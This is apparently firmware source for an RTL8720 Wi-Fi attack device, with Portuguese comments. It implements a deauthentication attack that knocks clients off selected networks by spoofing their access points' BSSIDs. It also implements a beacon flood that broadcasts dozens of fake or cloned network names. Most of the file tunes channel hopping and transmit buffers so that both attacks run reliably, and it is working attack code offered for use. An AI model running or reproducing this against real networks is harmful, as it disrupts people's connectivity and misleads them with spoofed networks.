// STL MUST come first
#undef max
#include <vector>

#include "wifi_attacks.h"

// ── Built-in SSID table ───────────────────────────────────
const char* BEACON_SSIDS[] = {
  "FBI Surveillance Van",
  "Loading... Please Wait",
  "Not Your WiFi",
  "Virus Detected!",
  "DEA Surveillance",
  "NSA MonitoringUnit4",
  "Skynet Global Defense",
  "Definitely Not NSA",
  "Pretty Fly for a WiFi",
  "The Internet",
  "Abraham Linksys",
  "Benjamin FrankLAN",
  "Bill Wi the Science Fi",
  "LAN Solo",
  "Tell My WiFi Love Her",
  "Wu-Tang LAN",
  "NETGEAR_EXT",
  "TP-Link_5G_EXT",
  "DIRECT-Roku-Player",
  "xfinitywifi",
  "ATT-WIFI-0001",
  "CLARO_FIBRA_5G",
  "VIVO-Fibra-EXT",
  "TIM_LIVE_2G",
  "HackerNet",
};

// ── Deauth state ──────────────────────────────────────────
ChannelGroup deauth_groups[MAX_CHANNELS];
int          deauth_group_count = 0;
int          current_group_idx  = 0;
uint32_t     sent_frames        = 0;
int          frames_per_deauth  = 1;  // 1 frame por burst — rate limiter em wifi_tx_raw_frame garante espacamento adequado
int          send_delay_ms      = 0;  // obsoleto, mantido por compatibilidade
bool         isDeauthing        = false;

// ── Beacon state ──────────────────────────────────────────
uint8_t      beacon_mac[6]         = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x00};
uint8_t      broadcast_mac[6]      = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int          beacon_ssid_idx       = 0;
uint32_t     beacon_frames         = 0;
bool         isBeaconing           = false;

BeaconMode   beacon_mode           = BEACON_MODE_RANDOM;
int          beacon_count          = 25;         // default: 25 SSIDs
char         beacon_custom_ssid[33]= "R4BB1T";   // default custom name

// ── Beacon channel hopping (mesma mecânica do ghost group do deauth) ──
// O anel de TX de gerenciamento do RTL8720 satura em ~33 descritores
// quando o rádio fica preso em um único canal — é exatamente o diagnóstico
// que originou o "ghost group" do deauth. No beacon o rádio nunca trocava
// de canal, então após poucos frames o alloc_mgtxmitframe() devolvia NULL
// e o firmware travava. Aqui a sintonia alterna a cada slot, esvaziando o
// anel antes que ele chegue ao limite.
static uint8_t  beacon_hop_channel       = 11;   // canal alternado (definido em start_beacon)
static int      last_hw_beacon_channel   = -1;
static bool     beacon_hop_slot          = false;
static uint32_t beacon_consec_fail       = 0;
static char     beacon_last_ssid[36]     = {0};

// ── Scheduler: manter todos os SSIDs "vivos" ao mesmo tempo ──
static uint32_t beacon_last_frame_ms     = 0;   // referencia do gap (instante REAL do TX)
static uint32_t beacon_last_attempt_ms   = 0;   // instante da ultima tentativa (diagnostico dt)
static uint32_t beacon_last_faillog_ms   = 0;   // throttle do log de falhas
static uint32_t beacon_rate_limited      = 0;   // descartes pelo limitador local (<8ms)
static uint32_t beacon_gap_ms            = 0;   // espacamento alvo entre beacons
static uint32_t beacon_hop_frames        = 0;   // beacons desde a ultima troca de canal
static uint32_t beacon_backoff_until_ms  = 0;   // respiro apos esgotar o anel de TX
static uint32_t beacon_round_start_ms    = 0;   // inicio da rodada atual
uint32_t        beacon_round_ms          = 0;   // duracao da ultima rodada completa
static uint16_t beacon_round_ok          = 0;   // sucessos na rodada atual
static uint16_t beacon_round_ok_last     = 0;   // sucessos da ultima rodada
static uint16_t beacon_round_target      = 0;   // SSIDs esperados na rodada

// ── get_beacon_ssid ───────────────────────────────────────
// SSID uniqueness strategy (safe, 802.11 max = 32 bytes):
//
//   RANDOM / CLONE: cycle through the pool of base SSIDs.
//     Each full cycle through the pool adds 1 NBSP pair (2 bytes) as suffix.
//     So idx=0..N-1 → pool[0..N-1] + no suffix
//        idx=N..2N-1 → pool[0..N-1] + 1 NBSP
//        idx=2N..3N-1 → pool[0..N-1] + 2 NBSP
//        ...capped when base+suffix would exceed 32 bytes.
//
//   CUSTOM: single base SSID. Each idx adds 1 NBSP pair as suffix,
//     capped at 32 bytes total.
//
// `out` must be at least 33 bytes.
void get_beacon_ssid(int idx, char* out, size_t outLen) {
  const char NBSP[2] = {(char)0xC2, (char)0xA0}; // UTF-8 Non-Breaking Space
  const int  SSID_MAX = 32; // 802.11 hard limit

  const char* base     = nullptr;
  char        cloneBase[33];
  int         poolSz   = 0;
  int         nbspCnt  = 0; // how many NBSP pairs to append

  switch (beacon_mode) {
    case BEACON_MODE_CUSTOM:
      base     = beacon_custom_ssid;
      poolSz   = 1;
      nbspCnt  = idx;          // 1 NBSP pair per idx
      break;

    case BEACON_MODE_CLONE: {
      int pool[MAX_SCAN_RESULTS];
      for (int i = 0; i < (int)scan_results.size(); i++)
        if (net_marked[i]) pool[poolSz++] = i;
      if (poolSz == 0)
        for (int i = 0; i < (int)scan_results.size(); i++) pool[poolSz++] = i;
      if (poolSz > 0) {
        int netIdx = pool[idx % poolSz];
        // Evita String::substring() (aloca no heap a cada render/envio):
        // copia direto do buffer interno, truncando em 32 bytes.
        const String& cloneSsid = scan_results[netIdx].ssid;
        size_t clen = cloneSsid.length();
        if (clen > (size_t)32) clen = 32;
        memcpy(cloneBase, cloneSsid.c_str(), clen);
        cloneBase[clen] = '\0';
        base = cloneBase;
      } else {
        base   = "Network";
        poolSz = 1;
      }
      nbspCnt = idx / poolSz;   // 1 NBSP pair added per full cycle
      break;
    }

    default: // BEACON_MODE_RANDOM
      base    = BEACON_SSIDS[idx % NUM_BEACON_SSIDS];
      poolSz  = NUM_BEACON_SSIDS;
      nbspCnt = idx / NUM_BEACON_SSIDS; // 1 NBSP per full cycle through 25 SSIDs
      break;
  }

  // Copy base, capped at SSID_MAX
  size_t blen = strlen(base);
  if ((int)blen > SSID_MAX)   blen = SSID_MAX;
  if (blen >= outLen)         blen = outLen - 1;
  memcpy(out, base, blen);
  size_t pos = blen;

  // Append NBSP pairs — hard stop at SSID_MAX total
  for (int n = 0; n < nbspCnt; n++) {
    if ((int)(pos + 2) > SSID_MAX) break; // 802.11 limit
    if (pos + 2 >= outLen)         break; // buffer limit
    out[pos++] = NBSP[0];
    out[pos++] = NBSP[1];
  }
  out[pos] = '\0';
}

// ── Telemetry & Failure Counters ──────────────────────────
uint32_t deauth_fail_count  = 0;
uint32_t beacon_fail_count  = 0;
static uint32_t last_deauth_stat_ms = 0;
static uint32_t last_beacon_stat_ms = 0;

#ifdef __cplusplus
extern "C" {
#endif
size_t xPortGetFreeHeapSize(void);
size_t xPortGetMinimumEverFreeHeapSize(void);
#ifdef __cplusplus
}
#endif

void log_system_diagnostics(const char* context) {
  size_t free_heap = xPortGetFreeHeapSize();
  size_t min_heap  = xPortGetMinimumEverFreeHeapSize();
  uint8_t hw_ch    = 0;
  int ch_res       = wext_get_channel(WLAN0_NAME, &hw_ch);

  DEBUG_SER_PRINT("\n==================================================\n");
  DEBUG_SER_PRINT("[SYS-DIAG] Contexto: ");
  DEBUG_SER_PRINT(context);
  DEBUG_SER_PRINT("\n");
  DEBUG_SER_PRINT("  -> Heap Livre Atual   : ");
  DEBUG_SER_PRINT((uint32_t)free_heap);
  DEBUG_SER_PRINT(" bytes\n");
  DEBUG_SER_PRINT("  -> Heap Min Historico : ");
  DEBUG_SER_PRINT((uint32_t)min_heap);
  DEBUG_SER_PRINT(" bytes\n");
  DEBUG_SER_PRINT("  -> Canal HW Ativo     : ");
  DEBUG_SER_PRINT((int)hw_ch);
  if (ch_res != 0) {
    DEBUG_SER_PRINT(" (wext_get_channel err=");
    DEBUG_SER_PRINT(ch_res);
    DEBUG_SER_PRINT(")");
  }
  DEBUG_SER_PRINT("\n");
  DEBUG_SER_PRINT("  -> Uptime Sistema     : ");
  DEBUG_SER_PRINT(millis());
  DEBUG_SER_PRINT(" ms\n");
  DEBUG_SER_PRINT("  -> Ptr rltk_wlan_info : 0x");
  DEBUG_SER_PRINT((uint32_t)rltk_wlan_info, HEX);
  DEBUG_SER_PRINT("\n");
  DEBUG_SER_PRINT("==================================================\n");
}

// ── Deauth ────────────────────────────────────────────────
static int last_hw_deauth_channel = -1;

// Calcula canal fantasma sempre dentro do range 1-11 (seguro FCC/ANATEL).
// Se o alvo estiver nos canais baixos (1-5) usamos ch 11, senão ch 1.
// Isso garante que wext_set_channel nunca recebe um canal proibido.
static inline int ghost_channel_for(int target_ch) {
  return (target_ch <= 5) ? 11 : 1;
}

void start_deauth() {
  DEBUG_SER_PRINT("\n[DEAUTH] >>> INICIANDO ATAQUE DEAUTH <<<\n");
  reset_tx_telemetry();
  log_system_diagnostics("START_DEAUTH");

  deauth_group_count = 0;
  current_group_idx  = 0;
  last_hw_deauth_channel = -1;
  deauth_fail_count  = 0;
  last_deauth_stat_ms= millis();

  // Se nenhum alvo foi marcado, mas temos scan_results, usa o alvo atualmente selecionado
  bool any_marked = false;
  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (net_marked[i]) { any_marked = true; break; }
  }
  if (!any_marked && !scan_results.empty() && net_sel < (int)scan_results.size()) {
    net_marked[net_sel] = true;
    DEBUG_SER_PRINT("[DEAUTH] Nenhum alvo estava marcado. Auto-selecionado indice ");
    DEBUG_SER_PRINT(net_sel);
    DEBUG_SER_PRINT(": '");
    DEBUG_SER_PRINT(scan_results[net_sel].ssid);
    DEBUG_SER_PRINT("'\n");
  }

  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (net_marked[i]) {
      int ch = scan_results[i].channel;
      int g_idx = -1;
      for (int g = 0; g < deauth_group_count; g++) {
        if (deauth_groups[g].channel == ch) { g_idx = g; break; }
      }
      if (g_idx == -1 && deauth_group_count < MAX_CHANNELS) {
        g_idx = deauth_group_count++;
        deauth_groups[g_idx].channel = ch;
        deauth_groups[g_idx].count   = 0;
      }
      if (g_idx != -1 && deauth_groups[g_idx].count < MAX_SCAN_RESULTS) {
        deauth_groups[g_idx].targets[deauth_groups[g_idx].count++] = i;
      }
    }
  }

  DEBUG_SER_PRINT("[DEAUTH] Grupos por canal formados: ");
  DEBUG_SER_PRINT(deauth_group_count);
  DEBUG_SER_PRINT("\n");

  // ── Grupo fantasma para single-canal ────────────────────────────────────────
  // Com apenas 1 grupo (1 rede, ou N redes no mesmo canal), o TX ring
  // do RTL8720 satura em ~33 frames porque nunca há troca de canal.
  // Solução: inserir um segundo grupo em canal diferente com 0 alvos.
  // O código multi-canal existente alterna automaticamente:
  //   ciclo par   → real_ch  → envia frames normalmente
  //   ciclo ímpar → ghost_ch → wext_set_channel (sem TX, count=0)
  // Espelha EXATAMENTE o comportamento de 2 redes em canais distintos:
  //   1 wext_set_channel por chamada, com 70ms de gap entre elas.
  if (deauth_group_count == 1 && deauth_group_count < MAX_CHANNELS) {
    int ghost_ch = ghost_channel_for(deauth_groups[0].channel);
    deauth_groups[1].channel = ghost_ch;
    deauth_groups[1].count   = 0;  // 0 alvos = sem TX no canal fantasma
    deauth_group_count       = 2;
    DEBUG_SER_PRINT("[DEAUTH] Canal unico detectado. Ghost group adicionado: ch=");
    DEBUG_SER_PRINT(ghost_ch);
    DEBUG_SER_PRINT(" (0 alvos - apenas troca de canal para drenar TX ring)\n");
  }

  for (int g = 0; g < deauth_group_count; g++) {
    DEBUG_SER_PRINT("  [Grupo ");
    DEBUG_SER_PRINT(g);
    DEBUG_SER_PRINT("] Canal ");
    DEBUG_SER_PRINT(deauth_groups[g].channel);
    DEBUG_SER_PRINT(" - Total Alvos: ");
    DEBUG_SER_PRINT(deauth_groups[g].count);
    DEBUG_SER_PRINT("\n");
    for (int t = 0; t < deauth_groups[g].count; t++) {
      int idx = deauth_groups[g].targets[t];
      DEBUG_SER_PRINT("    -> Alvo ");
      DEBUG_SER_PRINT(t);
      DEBUG_SER_PRINT(": SSID='");
      DEBUG_SER_PRINT(scan_results[idx].ssid);
      DEBUG_SER_PRINT("' BSSID=");
      DEBUG_SER_PRINT(scan_results[idx].bssid_str);
      DEBUG_SER_PRINT(" Ch=");
      DEBUG_SER_PRINT((int)scan_results[idx].channel);
      DEBUG_SER_PRINT(" RSSI=");
      DEBUG_SER_PRINT(scan_results[idx].rssi);
      DEBUG_SER_PRINT(" dBm\n");
    }
  }

  if (deauth_group_count > 0) {
    isDeauthing       = true;
    sent_frames       = 0;
    current_group_idx = 0;
    DEBUG_SER_PRINT("[DEAUTH] Ataque ativo com sucesso!\n");
  } else {
    DEBUG_SER_PRINT("[DEAUTH-WARN] Nenhum alvo configurado. Ataque nao iniciado.\n");
  }
}

void stop_deauth() {
  DEBUG_SER_PRINT("\n[DEAUTH] >>> PARANDO ATAQUE DEAUTH <<<\n");
  DEBUG_SER_PRINT("[DEAUTH] Total frames enviados: ");
  DEBUG_SER_PRINT(sent_frames);
  DEBUG_SER_PRINT(" | Falhas: ");
  DEBUG_SER_PRINT(deauth_fail_count);
  DEBUG_SER_PRINT("\n");
  log_system_diagnostics("STOP_DEAUTH");

  isDeauthing        = false;
  deauth_group_count = 0;
  current_group_idx  = 0;
  last_hw_deauth_channel = -1;
  deauth_fail_count  = 0;
}

void run_deauth_frame() {
  if (!isDeauthing || deauth_group_count == 0) return;

  ChannelGroup &g = deauth_groups[current_group_idx % deauth_group_count];

  // Troca de canal no início do ciclo, somente quando muda.
  // Com o ghost group, esta troca acontece a cada 2 ciclos, separada pelo
  // gap de 70ms do loop — idêntico ao comportamento de 2 redes em canais distintos.
  if (last_hw_deauth_channel != g.channel) {
    int ch_ret = wext_set_channel(WLAN0_NAME, g.channel);
    uint8_t verified_ch = 0;
    wext_get_channel(WLAN0_NAME, &verified_ch);
    if (ch_ret != 0 || verified_ch != g.channel) {
      DEBUG_SER_PRINT("[DEAUTH-HW-ERR] Falha mudanca canal ");
      DEBUG_SER_PRINT(g.channel);
      DEBUG_SER_PRINT(" (wext ret=");
      DEBUG_SER_PRINT(ch_ret);
      DEBUG_SER_PRINT(", hw_ch=");
      DEBUG_SER_PRINT((int)verified_ch);
      DEBUG_SER_PRINT(")\n");
    }
    last_hw_deauth_channel = g.channel;
    delay(15);
  }

  // Envia frames por alvo com respiração
  for (int t = 0; t < g.count; t++) {
    int idx = g.targets[t];
    if (idx < (int)scan_results.size()) {
      uint8_t bssid_copy[6];
      memcpy(bssid_copy, scan_results[idx].bssid, 6);
      int tx_res = wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      if (tx_res == TX_SUCCESS) {
        sent_frames++;
      } else {
        deauth_fail_count++;
        DEBUG_SER_PRINT("[DEAUTH-FAIL] Cod=");
        DEBUG_SER_PRINT(tx_res);
        DEBUG_SER_PRINT(" (");
        DEBUG_SER_PRINT(tx_status_str(tx_res));
        DEBUG_SER_PRINT(") dump_ret=");
        DEBUG_SER_PRINT(tx_telemetry.last_dump_ret);
        DEBUG_SER_PRINT(" Ch=");
        DEBUG_SER_PRINT(g.channel);
        DEBUG_SER_PRINT(" Tgt='");
        DEBUG_SER_PRINT(scan_results[idx].ssid);
        DEBUG_SER_PRINT("' BSSID=");
        DEBUG_SER_PRINT(scan_results[idx].bssid_str);
        DEBUG_SER_PRINT(" Heap=");
        DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
        DEBUG_SER_PRINT(" B\n");

        if (tx_res == TX_ERR_ALLOC_FRAME) {
          delay(6);
        }
      }
      delay(10);
      yield();
    }
  }
  yield();

  // Pausa uniforme pós-ciclo
  delay(8);

  current_group_idx = (current_group_idx + 1) % deauth_group_count;

  // Telemetria periodica a cada 2000ms
  if (millis() - last_deauth_stat_ms >= 2000) {
    last_deauth_stat_ms = millis();
    DEBUG_SER_PRINT("[DEAUTH-STAT] Enviados=");
    DEBUG_SER_PRINT(sent_frames);
    DEBUG_SER_PRINT(" | Falhas=");
    DEBUG_SER_PRINT(deauth_fail_count);
    DEBUG_SER_PRINT(" (AllocFail=");
    DEBUG_SER_PRINT(tx_telemetry.tx_alloc_failures);
    DEBUG_SER_PRINT(", DumpFail=");
    DEBUG_SER_PRINT(tx_telemetry.tx_dump_failures);
    DEBUG_SER_PRINT(") | Heap=");
    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
    DEBUG_SER_PRINT(" B (Min=");
    DEBUG_SER_PRINT((uint32_t)xPortGetMinimumEverFreeHeapSize());
    DEBUG_SER_PRINT(" B) | Canal=");
    DEBUG_SER_PRINT(g.channel);
    DEBUG_SER_PRINT("\n");
  }
}

// ── Beacon ────────────────────────────────────────────────

// Espacamento entre beacons para que uma rodada completa (todos os N SSIDs)
// caiba em BEACON_REFRESH_MS. O piso existe por causa do rate limiter de
// wifi_tx_raw_frame() (quadros a menos de 8ms sao descartados).
static uint32_t beacon_gap_for_count(int n) {
  if (n < 1) n = 1;
  uint32_t gap = (uint32_t)BEACON_REFRESH_MS / (uint32_t)n;
  if (gap < (uint32_t)BEACON_MIN_PACING_MS) gap = BEACON_MIN_PACING_MS;
  if (gap > (uint32_t)BEACON_MAX_PACING_MS) gap = BEACON_MAX_PACING_MS;
  return gap;
}

void start_beacon() {
  DEBUG_SER_PRINT("\n[BEACON] >>> INICIANDO BEACON FLOOD <<<\n");
  reset_tx_telemetry();
  log_system_diagnostics("START_BEACON");

  // Canal primário + canal de alternância (mesmo esquema do ghost group
  // do deauth: sempre dentro de 1-11, seguro FCC/ANATEL).
  uint8_t primary_ch = BEACON_CHANNEL;
#if BEACON_CHANNEL_HOP
  beacon_hop_channel = (uint8_t)ghost_channel_for(primary_ch);
#else
  beacon_hop_channel = primary_ch;   // hopping desligado
#endif
  last_hw_beacon_channel = -1;
  beacon_hop_slot        = false;
  beacon_consec_fail     = 0;
  beacon_last_ssid[0]    = '\0';

  int ch_res = wext_set_channel(WLAN0_NAME, primary_ch);
  uint8_t verified_ch = 0;
  wext_get_channel(WLAN0_NAME, &verified_ch);
  DEBUG_SER_PRINT("[BEACON] Canal configurado: ");
  DEBUG_SER_PRINT((int)primary_ch);
  DEBUG_SER_PRINT(" -> wext_res=");
  DEBUG_SER_PRINT(ch_res);
  DEBUG_SER_PRINT(" (hw_ch=");
  DEBUG_SER_PRINT((int)verified_ch);
  DEBUG_SER_PRINT(") | Canal alternado: ");
  DEBUG_SER_PRINT((int)beacon_hop_channel);
  DEBUG_SER_PRINT("\n");
  if (ch_res == 0 && verified_ch == primary_ch) {
    last_hw_beacon_channel = primary_ch;
  }

  // Respiro de acomodacao: deixa o driver devolver ao pool qualquer
  // descritor de gerenciamento ainda pendente (scan, ataque anterior).
  // Sem isso o primeiro beacon ja pode nascer com -4 (ancora cheia) e o
  // scheduler nunca mais consegue alocar.
  for (int i = 0; i < 8; i++) delay(10);

  const char* mode_str = (beacon_mode == BEACON_MODE_RANDOM) ? "RANDOM" :
                         (beacon_mode == BEACON_MODE_CLONE)  ? "CLONE" : "CUSTOM";
  DEBUG_SER_PRINT("[BEACON] Modo: ");
  DEBUG_SER_PRINT(mode_str);
  DEBUG_SER_PRINT(" | Qtd SSIDs: ");
  DEBUG_SER_PRINT(beacon_count);
  if (beacon_mode == BEACON_MODE_CUSTOM) {
    DEBUG_SER_PRINT(" | Nome Custom: '");
    DEBUG_SER_PRINT(beacon_custom_ssid);
    DEBUG_SER_PRINT("'");
  }
  DEBUG_SER_PRINT("\n");

  isBeaconing        = true;
  beacon_frames      = 0;
  beacon_ssid_idx    = 0;
  beacon_fail_count  = 0;
  last_beacon_stat_ms= millis();

  // ── Agenda: round-robin para manter TODOS os SSIDs no ar ──
  const int sched_count = (beacon_count > 0) ? beacon_count : NUM_BEACON_SSIDS;
  beacon_gap_ms           = beacon_gap_for_count(sched_count);
  beacon_round_target     = (uint16_t)sched_count;
  beacon_round_ms         = 0;
  beacon_round_ok         = 0;
  beacon_round_ok_last    = 0;
  beacon_hop_frames       = 0;
  beacon_backoff_until_ms = 0;
  beacon_last_frame_ms    = millis();
  beacon_last_attempt_ms  = 0;
  beacon_last_faillog_ms  = 0;
  beacon_rate_limited     = 0;
  beacon_round_start_ms   = millis();

  {
    uint32_t round_est = beacon_gap_ms * (uint32_t)sched_count;
    char sched[168];
    snprintf(sched, sizeof(sched),
             "[BEACON] Agenda: 1 beacon/%lums -> rodada de %d SSIDs em ~%lums (alvo %dms)\n",
             (unsigned long)beacon_gap_ms, sched_count,
             (unsigned long)round_est, (int)BEACON_REFRESH_MS);
    DEBUG_SER_PRINT(sched);
    if (round_est > 1500) {
      DEBUG_SER_PRINT("[BEACON] AVISO: N alto para o rate limiter do driver; a rodada passa de 1,5s e scanners mais rigorosos podem deixar redes expirarem.\n");
    }
  }
}

void stop_beacon() {
  DEBUG_SER_PRINT("\n[BEACON] >>> PARANDO BEACON FLOOD <<<\n");
  DEBUG_SER_PRINT("[BEACON] Total beacons enviados: ");
  DEBUG_SER_PRINT(beacon_frames);
  DEBUG_SER_PRINT(" | Falhas: ");
  DEBUG_SER_PRINT(beacon_fail_count);
  DEBUG_SER_PRINT("\n");
  log_system_diagnostics("STOP_BEACON");

  isBeaconing        = false;
  beacon_fail_count  = 0;
  beacon_consec_fail = 0;
  beacon_hop_slot    = false;
  beacon_hop_frames  = 0;
  beacon_last_frame_ms    = 0;
  beacon_last_attempt_ms  = 0;
  beacon_backoff_until_ms = 0;
  beacon_round_ms         = 0;
  beacon_round_ok         = 0;
  last_hw_beacon_channel = -1;
}

// MAC estável por índice de SSID (mesma lógica do deauth, que reaproveita
// o BSSID real do alvo em todos os frames). Trocar de MAC a cada pacote
// obrigava o driver a refazer o caminho de TX/peer constantemente.
static void beacon_mac_for_index(int idx, uint8_t mac[6]) {
  mac[0] = 0x02;                                 // locally administered, unicast
  mac[1] = 0xBB;                                 // prefixo fixo (R4BB1T)
  mac[2] = 0xCC;
  mac[3] = (uint8_t)(idx & 0xFF);
  mac[4] = (uint8_t)((idx >> 8) & 0xFF);
  mac[5] = (uint8_t)(0x5A ^ (uint8_t)idx);
}

// Monta e injeta um único beacon. Retorna o TxStatus do driver.
static int beacon_send_one(int idx) {
  beacon_mac_for_index(idx, beacon_mac);
  get_beacon_ssid(idx, beacon_last_ssid, sizeof(beacon_last_ssid));
  yield();
  return wifi_tx_beacon_frame(beacon_mac, broadcast_mac, beacon_last_ssid);
}

// =========================================================
// Scheduler do beacon flood
//
// Meta: manter TODOS os beacon_count SSIDs no ar ao mesmo tempo.
//
//  - 1 beacon por vez, round-robin estrito (0..N-1,0..). Assim cada SSID
//    e reenviado a cada ~gap*N ms e nenhum fica "esquecido".
//  - gap = BEACON_REFRESH_MS / N, com piso de 10ms (rate limiter do
//    driver) e teto de 100ms (N pequeno continua com taxa alta).
//  - A espera do gap usa delay(1): o loop Arduino roda em prioridade alta,
//    entao ele PRECISA bloquear para a task de TX do WiFi rodar e devolver
//    os buffers de gerenciamento ao pool. Espera ativa (millis()) esgota
//    o anel e faz todo beacon seguinte falhar com -4.
//  - O anel de TX e drenado trocando de canal a cada
//    BEACON_HOP_EVERY_FRAMES beacons.
// =========================================================
void run_beacon_frame() {
  if (!isBeaconing) return;

  const int safe_count = (beacon_count > 0) ? beacon_count : NUM_BEACON_SSIDS;
  uint32_t now = millis();

  // Respiro apos esgotar o anel de TX (evita insistir e travar).
  if ((int32_t)(now - beacon_backoff_until_ms) < 0) return;

  // ── Ritmo: um beacon por vez na cadencia da rodada ──────
  if (beacon_last_frame_ms != 0 &&
      (uint32_t)(now - beacon_last_frame_ms) < beacon_gap_ms) {
    // CRITICO: nao girar em espera ativa. O loop Arduino roda em prioridade
    // 7 no FreeRTOS (acima das tasks do driver WiFi); sem bloquear, a task
    // de TX nunca roda, os buffers de gerenciamento nao voltam para o pool
    // e alloc_mgtxmitframe() passa a devolver NULL (-4) para sempre.
    delay(1);
    return;
  }

  // ── Troca de canal (drenagem do anel de TX) ─────────────
  // Mesma mecanica do ghost group do deauth, mas agora apenas a cada
  // BEACON_HOP_EVERY_FRAMES beacons: trocar a cada 2 frames desperdicava
  // metade da rodada em cada canal.
  if (BEACON_CHANNEL_HOP && beacon_hop_frames >= BEACON_HOP_EVERY_FRAMES) {
    beacon_hop_frames = 0;
    int target_ch = beacon_hop_slot ? (int)BEACON_CHANNEL : (int)beacon_hop_channel;
    beacon_hop_slot = !beacon_hop_slot;
    if (last_hw_beacon_channel != target_ch) {
      int ch_ret = wext_set_channel(WLAN0_NAME, target_ch);
      uint8_t verified_ch = 0;
      wext_get_channel(WLAN0_NAME, &verified_ch);
      if (ch_ret != 0 || verified_ch != target_ch) {
        DEBUG_SER_PRINT("[BEACON-HW-ERR] Falha mudanca canal ");
        DEBUG_SER_PRINT(target_ch);
        DEBUG_SER_PRINT(" (wext ret=");
        DEBUG_SER_PRINT(ch_ret);
        DEBUG_SER_PRINT(", hw_ch=");
        DEBUG_SER_PRINT((int)verified_ch);
        DEBUG_SER_PRINT(")\n");
      }
      last_hw_beacon_channel = target_ch;
      delay(15);
    }
  }

  // ── 1 SSID por vez, sempre avancando (fairness) ─────────
  // O gap conta a partir do instante REAL do TX. Referencia-lo antes da
  // troca de canal (que leva ~15ms) fazia o proximo beacon sair ~1ms
  // depois deste e cair no rate limiter de 8ms do driver (Cod=-4).
  const uint32_t attempt_ms = millis();
  const uint32_t attempt_dt = (beacon_last_attempt_ms != 0)
                                ? (attempt_ms - beacon_last_attempt_ms) : 0;
  beacon_last_frame_ms   = attempt_ms;
  beacon_last_attempt_ms = attempt_ms;

  const int idx    = beacon_ssid_idx % safe_count;
  const int tx_res = beacon_send_one(idx);

  beacon_ssid_idx = (idx + 1) % safe_count;
  beacon_hop_frames++;

  if (tx_res == TX_SUCCESS) {
    beacon_frames++;
    beacon_round_ok++;
    beacon_consec_fail = 0;
  } else if (tx_res == TX_ERR_RATE_LIMIT) {
    // O quadro nem chegou ao driver (limitador local de 8ms). Nao e' anel
    // cheio: nao faz backoff nem troca de canal, so tenta no proximo gap.
    beacon_rate_limited++;
    beacon_consec_fail = 0;
  } else {
    beacon_fail_count++;
    beacon_consec_fail++;
    // Serial com flush custa ~9ms por linha e ainda atrasa o proximo
    // beacon: no maximo 2 linhas por segundo, sempre com o codigo real.
    if (millis() - beacon_last_faillog_ms >= 500) {
      beacon_last_faillog_ms = millis();
      char flog[176];
      snprintf(flog, sizeof(flog),
               "[BEACON-FAIL] Cod=%d (%s) dt=%lums consec=%lu falhas=%lu heap=%lu B SSID='%s'\n",
               tx_res, tx_status_str(tx_res),
               (unsigned long)attempt_dt,
               (unsigned long)beacon_consec_fail,
               (unsigned long)beacon_fail_count,
               (unsigned long)xPortGetFreeHeapSize(),
               beacon_last_ssid);
      DEBUG_SER_PRINT(flog);
    }

    if (tx_res == TX_ERR_ALLOC_FRAME) {
      // Anel realmente cheio: respira e forca re-sintonia no proximo
      // beacon (o contador no limite garante a troca de canal).
      beacon_backoff_until_ms = millis() + 25;
      beacon_hop_frames       = BEACON_HOP_EVERY_FRAMES;
      last_hw_beacon_channel  = -1;
    }

    // Trava de seguranca: se nem a troca de canal devolveu descritores,
    // interrompe o ataque antes de o firmware travar de vez.
    if (beacon_consec_fail >= BEACON_MAX_CONSEC_FAIL) {
      DEBUG_SER_PRINT("[BEACON-WARN] ");
      DEBUG_SER_PRINT((uint32_t)beacon_consec_fail);
      DEBUG_SER_PRINT(" falhas consecutivas - anel TX nao drenou. Ataque interrompido.\n");
      stop_beacon();
      return;
    }
  }

  // ── Fechamento de rodada: todos os SSIDs visitados ──────
  if (beacon_ssid_idx == 0) {
    uint32_t r = millis() - beacon_round_start_ms;
    beacon_round_start_ms = millis();
    beacon_round_ms       = r;
    beacon_round_ok_last  = beacon_round_ok;
    beacon_round_target   = (uint16_t)safe_count;
    beacon_round_ok       = 0;
  }

  // Devolve CPU ao driver imediatamente apos a tentativa: e' o que libera
  // o descritor de gerenciamento (o antigo delay(10) por frame cumpria
  // esse papel). Sem esse block o pool de buffers esgota e todo beacon
  // seguinte falha com -4 (alloc_mgtxmitframe == NULL). O restante do gap
  // e' preenchido pelo delay(1) da espera acima, que tambem cede CPU.
  delay(1);

  // ── Telemetria periodica (2s) ───────────────────────────
  now = millis();
  if (now - last_beacon_stat_ms >= 2000) {
    last_beacon_stat_ms = now;
    char line[224];
    snprintf(line, sizeof(line),
             "[BEACON-STAT] Beacons=%lu Falhas=%lu (Alloc=%lu Dump=%lu RateLimit=%lu) | Rodada=%lums p/ %u SSIDs (ok %u/%u) | Gap=%lums | Heap=%lu B | Canal=%d\n",
             (unsigned long)beacon_frames,
             (unsigned long)beacon_fail_count,
             (unsigned long)tx_telemetry.tx_alloc_failures,
             (unsigned long)tx_telemetry.tx_dump_failures,
             (unsigned long)beacon_rate_limited,
             (unsigned long)beacon_round_ms,
             (unsigned)beacon_round_target,
             (unsigned)beacon_round_ok_last,
             (unsigned)beacon_round_target,
             (unsigned long)beacon_gap_ms,
             (unsigned long)xPortGetFreeHeapSize(),
             last_hw_beacon_channel);
    DEBUG_SER_PRINT(line);
  }
}